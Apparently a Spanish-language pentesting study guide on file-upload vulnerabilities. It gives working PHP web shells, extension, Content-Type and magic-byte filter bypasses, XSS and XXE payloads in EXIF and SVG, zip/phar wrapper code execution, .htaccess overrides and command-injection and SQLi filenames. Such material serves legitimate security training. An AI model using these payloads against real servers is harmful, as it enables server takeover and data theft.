# 1. File-Upload ¿Como funciona?

La carga de archivos de usuario es una característica clave para la mayoría de las aplicaciones web modernas para permitir la extensibilidad y personalización de las aplicaciónes web (configuración de perfil y carga de datos personales)

*Un sitio web de redes sociales permite la carga de imágenes de perfil de usuario y otros medios sociales, mientras que un sitio web corporativo puede permitir a los usuarios cargar PDFs y otros documentos para uso corporativo.*

> [!CAUTION]
> La vulnerabilidad acontece cuando no se filtran ni validan correctamente los archivos que se suben y se terminan subiendo datos maliciosos que se interpretan por el backend de la aplicación, permitiendo al atacante ejecutar comandos arbitrarios y tomar el control del servidor

El ataque más común y crítico es el `RCE` (ejecución remota de comandos) mediante la carga de una `web shell` o un script que envíe una `reverse shell`, sobrescribir un archivos y configuraciones críticas del sistema o dar pie a otras vulnerabilidades como  `XSS` o `XXE`.

----
# 2. Reconocimiento 

## 2.1. Identidicar la tecnología del servidor
El primer paso para este ataque consiste en ver que tipo de lenguaje y archivos procesa el servidor. Necesitamos que nuestro código malicioso esté escrito en el mismo código que el backend. 

> [!NOTE]
> Normalmente vemos la extensión de la página en la ruta (por ejemplo `/uploads.php`), pero podemos encontrarnos sitios con `Web Routes` y `endpoints` que asignan URLs a páginas web o parte del código (Ej `/upload`). En este caso puede que nuestros archivos cargados no sean directamente enrutables o accesibles. 

Para averiguar la extensión podemos
- Visitar  la página `/index.ext` con extensiones comunes. Por ejemplo si visitamos `/index.php` y la obtenemos la misma página, significa que esta es, de hecho, una aplicación web `PHP` 
- Usar, la herramienta `wappalyzer` para ver, la versión del servidor web, el lenguaje que soporta, el sistema operativo del back-end y otras tecnologías en uso.

----
## 2.2. Ver como se procesa la subida
Tambien tenemos que subir un archivo normal y ver cómo se realiza la petición. Normalmente se realiza mediante peticiones tipo `multipart/form-data` dónde el cuerpo se divide en partes separadas por un `boundary`. Esta petición la podemos guardar en un archivo `request`. 

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary123

----Boundary123
Content-Disposition: form-data; name="nombreUsuario"

Lisbeth Salander
----Boundary123
Content-Disposition: form-data; name="avatar"; filename="foto.jpg"
Content-Type: image/jpeg

[bytes de la imagen...]
----Boundary123--
```

En este caso, el campo que nos interesa es el segundo. Las dos partes importantes en la petición son `filename="foto.jpg"` y el contenido del archivo al final de la petición.

#### Directorio de carga
**Tambien tenemos que ver dónde se guarda el archivo** (`upload directory`). Normalmente hay una ruta `/uploads`, aunque lo ideal es hacer click derecho sobre la imagen subida y ver a dónde lleva. 
- Muchas veces se codifica el nombre para evitar el acceso arbitrario, pero puede que se use una codificación predecible como `MD5`
- Uso de fuzzing u otras ulnerabilidades (p. ej., LFI/XXE) para encontrar dónde están los archivos subidos leyendo el código fuente de la aplicación web
- Fozar mensajes de error subiendo un archivo con un nombre que ya existe, enviar dos solicitudes idénticas simultáneamente o poniendo un nombre excesivamente largo,


-------
# 2. Explotación

## 2.1. Web shells y reverse shell
**Las web shells nos permiten ejecutar comandos aislados en el servidor, mientras que la reverse shell manda una consola a un listener controlado por el atacante.**

Podemos usar esta webshell en PHP `<?php system($_REQUEST['cmd']); ?>` y accedemos a ella por la ruta `http://web.com/uploads/shell.php?cmd=id`

Aun así existen para otros lenguajes como `.NET`:  `<% eval request('cmd') %>`. Y tenemos algunas en linea como [phpbash](https://github.com/Arrexel/phpbash).

> En ciertos casos las webshells pueden no funcionar ya que el servidor impida ciertas funciones como `system()` (consultar `phpinfo`) o existe un `WAF` de por medio.

En cuanto a las reverse shells, podemos encontrar en [Pentestmonkey]([Shells | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/shells)) o en [revshells]([Online - Reverse Shell Generator](https://www.revshells.com/)). Además, el repositorio [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)  también contiene scripts de reverse shell para varios lenguajes y frameworks web, y podemos utilizar cualquiera de ellos. Obviamente hay que editar la `IP` y el `PUERTO` de escucha para que correspondan con los de nuestra máquina,

Al subir la shell, debemos cambiar el nombre a `shell.php`

#### Bypass de comandos
Probamos a poner un php (si el server procesa php) simple cmo `<?php echo "Helo";?>`, despues si sigue todo bien, una webshell. Si da error probar bypass de comandos como:
- ponerlo en hexadecimal `system("\x73\x79..."); whoami` 
- hacer una mini web shell si limita el tamaño de archivo ``<?=`GET[0]`?>`` 
- o los trucos de command inyection


----
## 2.2. Validación del lado del cliente

> [!CAUTION]
> Muchas aplicaciones web solo dependen del código JavaScript del front-end para validar el formato del archivo seleccionado antes de que se suba y no lo subirían si el archivo no está en el formato requerido (p. ej., no es una imagen).. Esto es un error, ya que simplemente hay que modificar dicho código a través de las herramientas de desarrollador de nuestro navegador para deshabilitar cualquier validación existente.

Por ejemplo vemos que se ejecuta la línea `<input type="file" ... onchange="checkFile(this)"...>`. Si queremos podemos revisar la función en la pestaña `Console` y escribiendo la función `checkFile` para obtener sus detalles. Para evadirlo solo tenemos que quitarla `<input type="file" ... onchange=""...>`

Otra opción esque al seleccionar un formato distinto, el botón de `Upload` se deshabilite (se ponga en gris).  Vemos que la validación es del lado del cliente porque la página no se actualiza ni envía ninguna petición HTTP después de seleccionar nuestro archivo. La solución en este caso es realizar la petición con `burpsuite` o alguna herramienta cli.


----
## 2.3. Validación de extensiones
Al subir la shell, puede que tengamos un mensaje de error del backend como por ejemplo `Extension not allowed`. Esto implica que se ha utilizado un tipo de validación de lista.

| Tipo                       | Funcioanmiento                             | Falla si                                                                         |
| -------------------------- | ------------------------------------------ | -------------------------------------------------------------------------------- |
| Lista negra (`blacklist`)  | Indica una lista de extensiones prohibidas | Si no se han marcado todos los casos posibles de código ejecutable (Ej `.phtml`) |
| Lista blacna (`whitelist`) | Lista de extensiones permitidas            | Si dejamos alguna que permite ejecución de comandos                              |
Por ejemplo un código de blacklist sería:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) { echo "File type not allowed"; die(); }
```

Mientras que uno de whitelist utilizaría regex:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed"; die(); }
    
// correcto 🡆 if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName))
```

---
#### Fuzzing de extensiones

> [!TIP]
> En servidores Windows, los nombres de archivo no son sensibles a mayúsculas y minúsculas (case insensitive), por lo que podríamos intentar subir un `php` con una combinación de mayúsculas y minúsculas (por ejemplo, `pHp`), evadiendo así la lista negra.

Podemos hacer fuzzing a la funcionalidad de subida con una lista de extensiones potenciales y ver cuáles de ellas devuelven el mensaje de error anterior. Si no obtenemos un mensaje de error o se sube el archivo, habremos dado con la extensión correcta. Para ello podemos usar un diccionario de extensiones como: [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) o usar el diccionario `SecLists` de [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) comunes. En el archivo `request`, cambiamos `filename="foto.php"` a `filename="fotoFUZZ"`
```shell
$: $ffuf -request request.req -w ./extensions.txt -request-proto http -v -ms 26
```

-------
#### Doble extensión

Para la **whitelist** podemos usar el ataque de **doble extensión** `filename="foto.jpg.php"` pero si la regex del filtro está muy bien hecha, puede fallar. 

Si el servidor apache está configurado para procesar ciertos archivos como `php`, podemos usar la extensión doble inversa `shell.jpg.php`. La configuración vulnerable en `/etc/apache2/mods-enabled/php7.4.conf` es esta:
```php
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
// correcto 🡆 if <FilesMatch ".+\.ph(ar|p|tml)$">
```

-------
#### Inyección de caracteres
Tambien podemos hacer **inyección de caracteres,** dónde gracias a caracteres especiales haremos que malinterprete la extensión del archivo. Por ejemplo, el NULL byte funciona con servidores PHP 5.0 o menor `shell.php%00.jpg` o en Windows `shell.aspx:.jpg`
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

-------
#### Otros 

**Path traversal no sanitizado**: la ruta `/files/upload_avatar/` esta sanitizada, pero la anterior `/files/` no, asi que se have un path traversal en el nombre `filename="../shell.php` (urlencoded `filename="..%2fshell.php"`) y se accede con `/files/shell.php`


-------
## 2.4. Validación del contenido
Probar la extensión del archivo no es suficiente para prevenir los ataques de subida de archivos ya que puede que los filtros no funcionen bien. Además, podemos utilizar algunas extensiones permitidas (p. ej., SVG) para realizar otros ataques.

Es por esto que muchos servidores web y aplicaciones web modernos también prueban el contenido del archivo subido para asegurarse de que coincida con el tipo especificado. Si intentamos los ataques anteriores y seguimos obteniendo el mismo mensaje de error (`Only images are allowed`), puede que se realicen validaciones por contenido.

Existen dos métodos comunes para validar el contenido del archivo: la cabecera `Content-Type` o el contenido del archivo. 

----
#### Fuzzing de Content-Type
La web tiene este código en su backend, el cual revisa el `Content-Type`
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed"; die(); }
```

Si el mensaje de error nos dice que solo se permiten imagen, podemos utilizar la wordlist de seclist [Content-Type](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) y reducirla solo a los 45 tipos de imagen y fuzzear con ello
```bash
$: cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
$: $ffuf -request request.req -w ./extensions.txt -request-proto http -v -ms 26
```

> [!NOTE]
> Una solicitud HTTP de subida de archivo tiene dos cabeceras Content-Type, una para el archivo adjunto (en la parte inferior) y otra para la solicitud completa (en la parte superior). Generalmente necesitamos modificar la cabecera Content-Type del archivo, pero en algunos casos la solicitud solo contendrá la cabecera Content-Type principal (si el contenido subido fue enviado como datos `POST`), en cuyo caso necesitaremos modificar la cabecera Content-Type principal.

----
#### MIME Bypass
El segundo y más común tipo de validación de contenido de archivo es probar el `tipo MIME` del archivo subido. Este es un estándar de internet que determina el tipo de un archivo a través de su formato general y estructura de bytes.

Esto generalmente se hace inspeccionando los primeros bytes del contenido del archivo, que contienen la `signature` (firma) o tambien llamados `magic bytes`. Tenemos esta  [lista de firmas](https://en.wikipedia.org/wiki/List_of_file_signatures)

Por ejemplo, si un archivo comienza con (`GIF87a` o `GIF89a`), esto indica que es una imagen `GIF`, mientras que un archivo que comienza con texto plano generalmente se considera un archivo de `texto`. 

- Si cambiamos los primeros bytes de cualquier archivo por los bytes mágicos de `GIF`, su tipo MIME cambiaría a una imagen GIF, independientemente de su contenido restante o extensión. ¿Porqué GIF? Porque sus magic Bytes son imprimibles y por tanto fáciles de editar.
- Si subimos una foto, vemos que la firma JPEG es `FF D8 FF EE` (`ÿØ`). Si quitamos esa firma dirña que el archivo no es válido, así que hay que dejar ese par de bytes intactos y no tocar tampoco el `Content-Type`

Podemos usar una combinación de los dos métodos, lo que puede ayudarnos a evadir algunos filtros de contenido más robustos. Por ejemplo, podemos intentar usar un tipo `MIME` permitido con un `Content-Type` no permitido, un `MIME/Content-Type` no permitido con una extensión permitida... etc. 


-------
## 2.5. Otros ataques

Puede que el servidor no interprete `php`, `.NET` u otro lenguaje, o esté muy bien santizaido y nos permita solo un  tipo de archivos específico. Entonces , aún podríamos ser capaces de realizar algunos ataques en la aplicación web.

Otro tipo de archivos como `SVG`, `HTML`, `XML`, e incluso algunos archivos de imagen y documentos, permiten abordar otras vulnerabilidades ya que de cierta manera permitan ejecutar código o acceder a archivos internos. Es por eso que es tan importante el fuzzing a las extensiones de archivo permitidas. 

---
#### HTML y XSS
Puede que la web permita subir archivos `HMTL`, esto permite implementar código javascript para realizar ataques `Stored XSS` o `CSRF` si alguien accede dicho archivo. 

Un ejemplo son las aplicaciones web que muestran los metadatos de una imagen después de su subida (como "**Artist**" o "**Comment**")
```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' foto.jpg
```

Cuando se muestren los metadatos de la imagen, el payload de XSS debería activarse, y el código JavaScript se ejecutará para llevar a cabo el ataque XSS. Además, si cambiamos el tipo MIME (`MIME-Type`) de la imagen a `text/html`, algunas aplicaciones web pueden mostrarla como un documento HTML ejecutando el payload aunque los metadatos no se muestren directamente.

---
#### SVG y XML
Si podemos subir una imagen `SVG` (la cual se trata de gráficos que se renderizan a partir de un archivo `XML`) podemos incluir un payload  `XSS`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Una vez que subamos la imagen a la aplicación web, el payload de XSS se activará cada vez que se muestre la imagen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg 
[ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>' 
```

Podemos realizar un XXE en otros tipos de archivos que incluyen datos XML en su interior para especificar su formato y estructura, por ejemplo documentos PDF o documentos de office. Esto daría pie a ataques "`blind XXE`"


---
#### ZIPS y phar
Si nos permiten subir zips, podemos meter la webshell en un zip (llamado `shell.jpg`), de la siguiente manera:
```bash
$: echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Podemos utilizar el wrapper **zip** para ejecutar código PHP. Sin embargo, este wrapper no está habilitado por defecto, por lo que este método puede no funcionar siempre. 
```bash
http://web.com/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
# shell.jpg#shell.php&cmd=id
```

Finalmente, podemos usar el wrapper `phar://` para lograr un resultado similar. Para hacerlo, primero escribiremos el siguiente script PHP en un archivo `shell.php`:
```php
<?php
$phar = new Phar('shell.phar'); $phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>'); $phar->stopBuffering();
```

Por tanto se compilar el phar y se renombra a `shell.jpg`
```bash
$: php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Accedemos con el wrapper **phar**:
```bash
http://web.com/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
# shell.jpg/shell.txt&cmd=id
```

---
#### Sobre escribir código fuente
Puede que el servicio vulnerable nos permita subir archivos con extensión `.htaccess`. Esto permitirá que sobre-escribamos directivas del servidor para interpretar una extensión personalizada `.wtf` como archivo pdf.
```bash
AddType application/x-httpd-php .wtf
RewriteEngine off
```

O archivos `conf` como `/etc/apache2/apache2.conf`
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

 O en flask, modificando `/views.py`
```bash
@app.route('/exec')
def runcmd():
	return os.system(request.args.get('cmd')) 
```

---
#### imyecciones en el nombre de archivo
Podemos utilizar una cadena maliciosa para el nombre del archivo subido, que puede ser ejecutada o procesada si el nombre del archivo se muestra (se refleja) en la página. Esto puede dar a otros ataques 

- **OS command injection**: Por ejemplo, la aplicación va a mover el archivo subido con un comando del SO (Ej: `mv file.jpg /tmp`). Podemos inyectar en el nombre comandos `file$(whoami).jpg` o ``file`whoami`.jpg`` o `file.jpg||whoami`
- **XSS**: si se refleja el nombre del archivo: `<script>alert(window.origin);</script>`
- **SQLi**: Si el nombre del archivo se usa en una consulta SQL `file';select+sleep(5);--.jpg`
- **Generar errores**: subir dos veces un archivo con el mismo nombre, o un nombre extremadamente largo o en windows caracteres como `(|, <, >, *, or ?)` o nombres reservados omo `(CON, COM1, LPT1, or NUL)`
- En Windows podemos usar la virgurilla y un dígito, que equivale los archivos coincidentes que comienzan con "x". Por ejemplo `WEB~1.CON` sustituirá a `web.conf`


